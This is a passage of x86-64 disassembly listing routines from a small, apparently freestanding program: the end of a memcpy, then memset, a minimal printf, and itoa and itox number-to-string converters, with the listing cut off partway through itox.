  40241f:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  402423:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  402427:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40242b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  402432:	eb 1b                	jmp    40244f <_memcpy+0x47>
  402434:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402438:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  40243b:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40243f:	88 10                	mov    BYTE PTR [rax],dl
  402441:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402446:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  40244b:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40244f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402452:	39 45 cc             	cmp    DWORD PTR [rbp-0x34],eax
  402455:	77 dd                	ja     402434 <_memcpy+0x2c>
  402457:	90                   	nop
  402458:	90                   	nop
  402459:	5d                   	pop    rbp
  40245a:	c3                   	ret    

000000000040245b <Memset>:
  40245b:	f3 0f 1e fa          	endbr64 
  40245f:	55                   	push   rbp
  402460:	48 89 e5             	mov    rbp,rsp
  402463:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402467:	89 f0                	mov    eax,esi
  402469:	89 55 e0             	mov    DWORD PTR [rbp-0x20],edx
  40246c:	88 45 e4             	mov    BYTE PTR [rbp-0x1c],al
  40246f:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402473:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402477:	8b 45 e0             	mov    eax,DWORD PTR [rbp-0x20]
  40247a:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
  40247d:	eb 0f                	jmp    40248e <Memset+0x33>
  40247f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402483:	0f b6 55 e4          	movzx  edx,BYTE PTR [rbp-0x1c]
  402487:	88 10                	mov    BYTE PTR [rax],dl
  402489:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  40248e:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  402491:	8d 50 ff             	lea    edx,[rax-0x1]
  402494:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  402497:	85 c0                	test   eax,eax
  402499:	75 e4                	jne    40247f <Memset+0x24>
  40249b:	90                   	nop
  40249c:	90                   	nop
  40249d:	5d                   	pop    rbp
  40249e:	c3                   	ret    

000000000040249f <_printf>:
  40249f:	f3 0f 1e fa          	endbr64 
  4024a3:	55                   	push   rbp
  4024a4:	48 89 e5             	mov    rbp,rsp
  4024a7:	48 81 ec 10 01 00 00 	sub    rsp,0x110
  4024ae:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  4024b5:	48 89 b5 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],rsi
  4024bc:	48 89 95 60 ff ff ff 	mov    QWORD PTR [rbp-0xa0],rdx
  4024c3:	48 89 8d 68 ff ff ff 	mov    QWORD PTR [rbp-0x98],rcx
  4024ca:	4c 89 85 70 ff ff ff 	mov    QWORD PTR [rbp-0x90],r8
  4024d1:	4c 89 8d 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],r9
  4024d8:	84 c0                	test   al,al
  4024da:	74 20                	je     4024fc <_printf+0x5d>
  4024dc:	0f 29 45 80          	movaps XMMWORD PTR [rbp-0x80],xmm0
  4024e0:	0f 29 4d 90          	movaps XMMWORD PTR [rbp-0x70],xmm1
  4024e4:	0f 29 55 a0          	movaps XMMWORD PTR [rbp-0x60],xmm2
  4024e8:	0f 29 5d b0          	movaps XMMWORD PTR [rbp-0x50],xmm3
  4024ec:	0f 29 65 c0          	movaps XMMWORD PTR [rbp-0x40],xmm4
  4024f0:	0f 29 6d d0          	movaps XMMWORD PTR [rbp-0x30],xmm5
  4024f4:	0f 29 75 e0          	movaps XMMWORD PTR [rbp-0x20],xmm6
  4024f8:	0f 29 7d f0          	movaps XMMWORD PTR [rbp-0x10],xmm7
  4024fc:	48 c7 85 20 ff ff ff 	mov    QWORD PTR [rbp-0xe0],0x0
  402503:	00 00 00 00 
  402507:	48 c7 85 28 ff ff ff 	mov    QWORD PTR [rbp-0xd8],0x0
  40250e:	00 00 00 00 
  402512:	48 c7 85 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],0x0
  402519:	00 00 00 00 
  40251d:	66 c7 85 38 ff ff ff 	mov    WORD PTR [rbp-0xc8],0x0
  402524:	00 00 
  402526:	c7 85 08 ff ff ff 08 	mov    DWORD PTR [rbp-0xf8],0x8
  40252d:	00 00 00 
  402530:	c7 85 0c ff ff ff 30 	mov    DWORD PTR [rbp-0xf4],0x30
  402537:	00 00 00 
  40253a:	48 8d 45 10          	lea    rax,[rbp+0x10]
  40253e:	48 89 85 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rax
  402545:	48 8d 85 50 ff ff ff 	lea    rax,[rbp-0xb0]
  40254c:	48 89 85 18 ff ff ff 	mov    QWORD PTR [rbp-0xe8],rax
  402553:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  40255a:	00 00 00 
  40255d:	e9 6d 02 00 00       	jmp    4027cf <_printf+0x330>
  402562:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402569:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40256c:	3c 25                	cmp    al,0x25
  40256e:	74 31                	je     4025a1 <_printf+0x102>
  402570:	83 bd 4c ff ff ff 00 	cmp    DWORD PTR [rbp-0xb4],0x0
  402577:	75 28                	jne    4025a1 <_printf+0x102>
  402579:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402580:	ba 01 00 00 00       	mov    edx,0x1
  402585:	48 89 c6             	mov    rsi,rax
  402588:	bf 01 00 00 00       	mov    edi,0x1
  40258d:	e8 b9 fb ff ff       	call   40214b <_write>
  402592:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  402599:	00 00 00 
  40259c:	e9 26 02 00 00       	jmp    4027c7 <_printf+0x328>
  4025a1:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4025a8:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4025ab:	3c 25                	cmp    al,0x25
  4025ad:	0f 84 0a 02 00 00    	je     4027bd <_printf+0x31e>
  4025b3:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4025ba:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4025bd:	0f be c0             	movsx  eax,al
  4025c0:	83 f8 78             	cmp    eax,0x78
  4025c3:	0f 84 61 01 00 00    	je     40272a <_printf+0x28b>
  4025c9:	83 f8 78             	cmp    eax,0x78
  4025cc:	0f 8f c5 01 00 00    	jg     402797 <_printf+0x2f8>
  4025d2:	83 f8 75             	cmp    eax,0x75
  4025d5:	74 79                	je     402650 <_printf+0x1b1>
  4025d7:	83 f8 75             	cmp    eax,0x75
  4025da:	0f 8f b7 01 00 00    	jg     402797 <_printf+0x2f8>
  4025e0:	83 f8 64             	cmp    eax,0x64
  4025e3:	0f 84 d4 00 00 00    	je     4026bd <_printf+0x21e>
  4025e9:	83 f8 73             	cmp    eax,0x73
  4025ec:	0f 85 a5 01 00 00    	jne    402797 <_printf+0x2f8>
  4025f2:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4025f8:	83 f8 2f             	cmp    eax,0x2f
  4025fb:	77 23                	ja     402620 <_printf+0x181>
  4025fd:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402604:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40260a:	89 d2                	mov    edx,edx
  40260c:	48 01 d0             	add    rax,rdx
  40260f:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402615:	83 c2 08             	add    edx,0x8
  402618:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  40261e:	eb 12                	jmp    402632 <_printf+0x193>
  402620:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  402627:	48 8d 50 08          	lea    rdx,[rax+0x8]
  40262b:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  402632:	48 8b 00             	mov    rax,QWORD PTR [rax]
  402635:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  40263c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  402643:	48 89 c7             	mov    rdi,rax
  402646:	e8 cd 04 00 00       	call   402b18 <_puts>
  40264b:	e9 61 01 00 00       	jmp    4027b1 <_printf+0x312>
  402650:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  402656:	83 f8 2f             	cmp    eax,0x2f
  402659:	77 23                	ja     40267e <_printf+0x1df>
  40265b:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402662:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402668:	89 d2                	mov    edx,edx
  40266a:	48 01 d0             	add    rax,rdx
  40266d:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402673:	83 c2 08             	add    edx,0x8
  402676:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  40267c:	eb 12                	jmp    402690 <_printf+0x1f1>
  40267e:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  402685:	48 8d 50 08          	lea    rdx,[rax+0x8]
  402689:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  402690:	8b 00                	mov    eax,DWORD PTR [rax]
  402692:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  402698:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  40269e:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  4026a5:	48 89 d6             	mov    rsi,rdx
  4026a8:	48 89 c7             	mov    rdi,rax
  4026ab:	e8 38 01 00 00       	call   4027e8 <itoa>
  4026b0:	48 89 c7             	mov    rdi,rax
  4026b3:	e8 60 04 00 00       	call   402b18 <_puts>
  4026b8:	e9 f4 00 00 00       	jmp    4027b1 <_printf+0x312>
  4026bd:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4026c3:	83 f8 2f             	cmp    eax,0x2f
  4026c6:	77 23                	ja     4026eb <_printf+0x24c>
  4026c8:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  4026cf:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4026d5:	89 d2                	mov    edx,edx
  4026d7:	48 01 d0             	add    rax,rdx
  4026da:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4026e0:	83 c2 08             	add    edx,0x8
  4026e3:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  4026e9:	eb 12                	jmp    4026fd <_printf+0x25e>
  4026eb:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  4026f2:	48 8d 50 08          	lea    rdx,[rax+0x8]
  4026f6:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  4026fd:	8b 00                	mov    eax,DWORD PTR [rax]
  4026ff:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  402705:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  40270b:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  402712:	48 89 d6             	mov    rsi,rdx
  402715:	48 89 c7             	mov    rdi,rax
  402718:	e8 cb 00 00 00       	call   4027e8 <itoa>
  40271d:	48 89 c7             	mov    rdi,rax
  402720:	e8 f3 03 00 00       	call   402b18 <_puts>
  402725:	e9 87 00 00 00       	jmp    4027b1 <_printf+0x312>
  40272a:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  402730:	83 f8 2f             	cmp    eax,0x2f
  402733:	77 23                	ja     402758 <_printf+0x2b9>
  402735:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  40273c:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402742:	89 d2                	mov    edx,edx
  402744:	48 01 d0             	add    rax,rdx
  402747:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40274d:	83 c2 08             	add    edx,0x8
  402750:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  402756:	eb 12                	jmp    40276a <_printf+0x2cb>
  402758:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  40275f:	48 8d 50 08          	lea    rdx,[rax+0x8]
  402763:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  40276a:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40276d:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  402774:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40277b:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  402782:	48 89 d6             	mov    rsi,rdx
  402785:	48 89 c7             	mov    rdi,rax
  402788:	e8 dd 01 00 00       	call   40296a <itox>
  40278d:	48 89 c7             	mov    rdi,rax
  402790:	e8 83 03 00 00       	call   402b18 <_puts>
  402795:	eb 1a                	jmp    4027b1 <_printf+0x312>
  402797:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40279e:	ba 01 00 00 00       	mov    edx,0x1
  4027a3:	48 89 c6             	mov    rsi,rax
  4027a6:	bf 01 00 00 00       	mov    edi,0x1
  4027ab:	e8 9b f9 ff ff       	call   40214b <_write>
  4027b0:	90                   	nop
  4027b1:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  4027b8:	00 00 00 
  4027bb:	eb 0a                	jmp    4027c7 <_printf+0x328>
  4027bd:	c7 85 4c ff ff ff 01 	mov    DWORD PTR [rbp-0xb4],0x1
  4027c4:	00 00 00 
  4027c7:	48 83 85 f8 fe ff ff 	add    QWORD PTR [rbp-0x108],0x1
  4027ce:	01 
  4027cf:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4027d6:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4027d9:	84 c0                	test   al,al
  4027db:	0f 85 81 fd ff ff    	jne    402562 <_printf+0xc3>
  4027e1:	b8 01 00 00 00       	mov    eax,0x1
  4027e6:	c9                   	leave  
  4027e7:	c3                   	ret    

00000000004027e8 <itoa>:
  4027e8:	f3 0f 1e fa          	endbr64 
  4027ec:	55                   	push   rbp
  4027ed:	48 89 e5             	mov    rbp,rsp
  4027f0:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4027f4:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4027f8:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4027ff:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  402803:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  40280a:	66 66 66 
  40280d:	48 89 c8             	mov    rax,rcx
  402810:	48 f7 ea             	imul   rdx
  402813:	48 c1 fa 02          	sar    rdx,0x2
  402817:	48 89 c8             	mov    rax,rcx
  40281a:	48 c1 f8 3f          	sar    rax,0x3f
  40281e:	48 29 c2             	sub    rdx,rax
  402821:	48 89 d0             	mov    rax,rdx
  402824:	48 c1 e0 02          	shl    rax,0x2
  402828:	48 01 d0             	add    rax,rdx
  40282b:	48 01 c0             	add    rax,rax
  40282e:	48 29 c1             	sub    rcx,rax
  402831:	48 89 ca             	mov    rdx,rcx
  402834:	89 d0                	mov    eax,edx
  402836:	8d 48 30             	lea    ecx,[rax+0x30]
  402839:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40283c:	48 63 d0             	movsxd rdx,eax
  40283f:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402843:	48 01 d0             	add    rax,rdx
  402846:	89 ca                	mov    edx,ecx
  402848:	88 10                	mov    BYTE PTR [rax],dl
  40284a:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  40284e:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  402855:	66 66 66 
  402858:	48 89 c8             	mov    rax,rcx
  40285b:	48 f7 ea             	imul   rdx
  40285e:	48 c1 fa 02          	sar    rdx,0x2
  402862:	48 89 c8             	mov    rax,rcx
  402865:	48 c1 f8 3f          	sar    rax,0x3f
  402869:	48 29 c2             	sub    rdx,rax
  40286c:	48 89 d0             	mov    rax,rdx
  40286f:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402873:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  402877:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  40287c:	75 81                	jne    4027ff <itoa+0x17>
  40287e:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402881:	48 63 d0             	movsxd rdx,eax
  402884:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402888:	48 01 d0             	add    rax,rdx
  40288b:	c6 00 00             	mov    BYTE PTR [rax],0x0
  40288e:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  402895:	e9 b5 00 00 00       	jmp    40294f <itoa+0x167>
  40289a:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40289d:	48 63 d0             	movsxd rdx,eax
  4028a0:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028a4:	48 01 d0             	add    rax,rdx
  4028a7:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  4028aa:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028ad:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028b0:	48 98                	cdqe   
  4028b2:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  4028b6:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028ba:	48 01 d0             	add    rax,rdx
  4028bd:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  4028c0:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028c3:	48 63 d0             	movsxd rdx,eax
  4028c6:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028ca:	48 01 d0             	add    rax,rdx
  4028cd:	31 ce                	xor    esi,ecx
  4028cf:	89 f2                	mov    edx,esi
  4028d1:	88 10                	mov    BYTE PTR [rax],dl
  4028d3:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028d6:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028d9:	48 98                	cdqe   
  4028db:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  4028df:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028e3:	48 01 d0             	add    rax,rdx
  4028e6:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  4028e9:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028ec:	48 63 d0             	movsxd rdx,eax
  4028ef:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028f3:	48 01 d0             	add    rax,rdx
  4028f6:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  4028f9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028fc:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028ff:	48 98                	cdqe   
  402901:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402905:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402909:	48 01 d0             	add    rax,rdx
  40290c:	31 ce                	xor    esi,ecx
  40290e:	89 f2                	mov    edx,esi
  402910:	88 10                	mov    BYTE PTR [rax],dl
  402912:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402915:	48 63 d0             	movsxd rdx,eax
  402918:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40291c:	48 01 d0             	add    rax,rdx
  40291f:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402922:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402925:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402928:	48 98                	cdqe   
  40292a:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  40292e:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402932:	48 01 d0             	add    rax,rdx
  402935:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402938:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40293b:	48 63 d0             	movsxd rdx,eax
  40293e:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402942:	48 01 d0             	add    rax,rdx
  402945:	31 ce                	xor    esi,ecx
  402947:	89 f2                	mov    edx,esi
  402949:	88 10                	mov    BYTE PTR [rax],dl
  40294b:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  40294f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402952:	89 c2                	mov    edx,eax
  402954:	c1 ea 1f             	shr    edx,0x1f
  402957:	01 d0                	add    eax,edx
  402959:	d1 f8                	sar    eax,1
  40295b:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  40295e:	0f 8c 36 ff ff ff    	jl     40289a <itoa+0xb2>
  402964:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402968:	5d                   	pop    rbp
  402969:	c3                   	ret    

000000000040296a <itox>:
  40296a:	f3 0f 1e fa          	endbr64 
  40296e:	55                   	push   rbp
  40296f:	48 89 e5             	mov    rbp,rsp
  402972:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402976:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40297a:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  402981:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402985:	48 99                	cqo    
  402987:	48 c1 ea 3c          	shr    rdx,0x3c
  40298b:	48 01 d0             	add    rax,rdx
  40298e:	83 e0 0f             	and    eax,0xf
  402991:	48 29 d0             	sub    rax,rdx
  402994:	48 89 c1             	mov    rcx,rax
  402997:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40299a:	48 63 d0             	movsxd rdx,eax
  40299d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029a1:	48 01 d0             	add    rax,rdx
  4029a4:	89 ca                	mov    edx,ecx
  4029a6:	88 10                	mov    BYTE PTR [rax],dl
  4029a8:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029ab:	48 63 d0             	movsxd rdx,eax
  4029ae:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029b2:	48 01 d0             	add    rax,rdx
  4029b5:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4029b8:	3c 09                	cmp    al,0x9
  4029ba:	7e 26                	jle    4029e2 <itox+0x78>
  4029bc:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029bf:	48 63 d0             	movsxd rdx,eax
  4029c2:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029c6:	48 01 d0             	add    rax,rdx
  4029c9:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4029cc:	8d 48 57             	lea    ecx,[rax+0x57]
  4029cf:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029d2:	48 63 d0             	movsxd rdx,eax
  4029d5:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029d9:	48 01 d0             	add    rax,rdx
  4029dc:	89 ca                	mov    edx,ecx
  4029de:	88 10                	mov    BYTE PTR [rax],dl
  4029e0:	eb 24                	jmp    402a06 <itox+0x9c>
  4029e2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029e5:	48 63 d0             	movsxd rdx,eax
  4029e8:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029ec:	48 01 d0             	add    rax,rdx
  4029ef:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4029f2:	8d 48 30             	lea    ecx,[rax+0x30]
  4029f5:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029f8:	48 63 d0             	movsxd rdx,eax
  4029fb:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029ff:	48 01 d0             	add    rax,rdx
  402a02:	89 ca                	mov    edx,ecx
  402a04:	88 10                	mov    BYTE PTR [rax],dl
  402a06:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402a0a:	48 8d 50 0f          	lea    rdx,[rax+0xf]
  402a0e:	48 85 c0             	test   rax,rax
  402a11:	48 0f 48 c2          	cmovs  rax,rdx
  402a15:	48 c1 f8 04          	sar    rax,0x4
  402a19:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402a1d:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  402a21:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402a26:	0f 85 55 ff ff ff    	jne    402981 <itox+0x17>
  402a2c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a2f:	48 63 d0             	movsxd rdx,eax
  402a32:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a36:	48 01 d0             	add    rax,rdx
  402a39:	c6 00 00             	mov    BYTE PTR [rax],0x0
  402a3c:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  402a43:	e9 b5 00 00 00       	jmp    402afd <itox+0x193>
  402a48:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a4b:	48 63 d0             	movsxd rdx,eax
  402a4e:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a52:	48 01 d0             	add    rax,rdx
  402a55:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a58:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a5b:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a5e:	48 98                	cdqe   
  402a60:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a64:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a68:	48 01 d0             	add    rax,rdx
  402a6b:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402a6e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a71:	48 63 d0             	movsxd rdx,eax
  402a74:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a78:	48 01 d0             	add    rax,rdx
  402a7b:	31 ce                	xor    esi,ecx
  402a7d:	89 f2                	mov    edx,esi
  402a7f:	88 10                	mov    BYTE PTR [rax],dl
  402a81:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a84:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a87:	48 98                	cdqe   
  402a89:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a8d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a91:	48 01 d0             	add    rax,rdx
  402a94:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a97:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a9a:	48 63 d0             	movsxd rdx,eax
  402a9d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402aa1:	48 01 d0             	add    rax,rdx
  402aa4:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402aa7:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402aaa:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402aad:	48 98                	cdqe   
  402aaf:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402ab3:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402ab7:	48 01 d0             	add    rax,rdx
  402aba:	31 ce                	xor    esi,ecx
  402abc:	89 f2                	mov    edx,esi
  402abe:	88 10                	mov    BYTE PTR [rax],dl
  402ac0:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402ac3:	48 63 d0             	movsxd rdx,eax
  402ac6:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402aca:	48 01 d0             	add    rax,rdx
  402acd:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402ad0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402ad3:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402ad6:	48 98                	cdqe   
  402ad8:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402adc:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402ae0:	48 01 d0             	add    rax,rdx
  402ae3:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402ae6:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402ae9:	48 63 d0             	movsxd rdx,eax
